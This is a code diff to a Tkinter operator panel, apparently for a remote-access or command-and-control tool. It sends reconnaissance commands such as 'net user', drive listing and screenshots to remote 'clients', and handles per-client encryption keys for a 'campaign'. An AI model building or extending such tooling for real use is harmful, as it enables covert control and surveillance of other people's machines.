@@ -86,6 +86,16 @@ class ClientInteractionUI:
         ttk.Button(row2_frame, text="get users", width=15, command=lambda: self.send_command("net user")).pack(side=tk.LEFT, padx=5)
         ttk.Button(row2_frame, text="get drives", width=15, command=lambda: self.send_command("wmic logicaldisk get deviceid, volumename, description")).pack(side=tk.LEFT, padx=5)
         ttk.Button(row2_frame, text="screenshot", width=15, command=lambda: self.send_command("screenshot", command_type="screenshot")).pack(side=tk.LEFT, padx=5)
+        
+        # Row 3 of quick commands - Add key management commands
+        row3_frame = ttk.Frame(quick_cmd_frame)
+        row3_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
+        
+        ttk.Button(row3_frame, text="Key Status", width=15, 
+                  command=lambda: self.send_command("echo 'Checking key status...'", command_type="key_status")).pack(side=tk.LEFT, padx=5)
+        
+        ttk.Button(row3_frame, text="Client Info", width=15,
+                  command=lambda: self.send_command("Get-SystemIdentification", command_type="system_info")).pack(side=tk.LEFT, padx=5)
     
     def submit_command(self, event=None):
         """Submit the command when Enter is pressed"""
@@ -154,27 +164,79 @@ class ClientInteractionUI:
     
     def update_interaction_display(self):
         """Update the interaction display with new command results"""
-        history = self.client_manager.get_client_history(self.client_id)
-        
-        # Look for new results that haven't been displayed yet
-        for command in history:
-            timestamp = command.get('timestamp', '')
-            command_type = command.get('command_type', 'unknown')
-            args = command.get('args', '')
+        try:
+            # Add debug logging
+            self.logger(f"Updating interaction display for client {self.client_id}")
             
-            # Only process if it has a result and hasn't been displayed yet
-            if 'result' in command and 'displayed_in_interaction' not in command:
-                result = command.get('result', '')
-                
-                # Format the output with timestamp
-                formatted_time = timestamp.split()[1] if ' ' in timestamp else timestamp  # Just show time part
-                output = f"\n[{formatted_time}] Command result:\n"
-                output += "-" * 50 + "\n"
-                output += result + "\n"
-                output += "-" * 50 + "\n"
-                
-                # Append to display
-                self.append_output(output)
-                
-                # Mark as displayed
-                command['displayed_in_interaction'] = True
+            history = self.client_manager.get_client_history(self.client_id)
+            if not history:
+                self.logger(f"No command history found for client {self.client_id}")
+                return
+            
+            # Look for new results that haven't been displayed yet
+            for command in history:
+                try:
+                    timestamp = command.get('timestamp', '')
+                    command_type = command.get('command_type', 'unknown')
+                    args = command.get('args', '')
+                    
+                    # Only process if it has a result and hasn't been displayed yet
+                    if 'result' in command and 'displayed_in_interaction' not in command:
+                        result = command.get('result', '')
+                        
+                        # Format the output with timestamp
+                        formatted_time = timestamp.split()[1] if ' ' in timestamp else timestamp  # Just show time part
+                        output = f"\n[{formatted_time}] Command result ({command_type}):\n"
+                        output += "-" * 50 + "\n"
+                        
+                        # Handle different result formats and command types
+                        if command_type == "key_rotation":
+                            # Special formatting for key rotation results
+                            output += "Key rotation command processed\n"
+                            if isinstance(result, dict):
+                                for key, value in result.items():
+                                    output += f"{key}: {value}\n"
+                            else:
+                                output += str(result) + "\n"
+                            output += "Note: Communication is now using a client-specific key\n"
+                        elif command_type == "key_status":
+                            # Special formatting for key status results
+                            if "key" in str(result).lower():
+                                output += result + "\n"
+                            else:
+                                # Try to extract key info from system info
+                                client_info = self.client_manager.get_client_info(self.client_id)
+                                if client_info and 'key_id' in client_info:
+                                    output += f"Current key ID: {client_info['key_id']}\n"
+                                else:
+                                    output += "Using campaign default key\n"
+                                output += result + "\n"
+                        elif command_type == "system_info":
+                            # Format system info nicely
+                            if isinstance(result, dict):
+                                for key, value in result.items():
+                                    output += f"{key}: {value}\n"
+                            else:
+                                # Try to parse JSON string
+                                try:
+                                    import json
+                                    info = json.loads(result)
+                                    for key, value in info.items():
+                                        output += f"{key}: {value}\n"
+                                except:
+                                    output += result + "\n"
+                        else:
+                            # Regular command result
+                            output += result + "\n"
+                            
+                        output += "-" * 50 + "\n"
+                        
+                        # Append to display
+                        self.append_output(output)
+                        
+                        # Mark as displayed
+                        command['displayed_in_interaction'] = True
+                except Exception as e:
+                    self.logger(f"Error processing command result: {e}")
+        except Exception as e:
+            self.logger(f"Error updating interaction display: {e}")
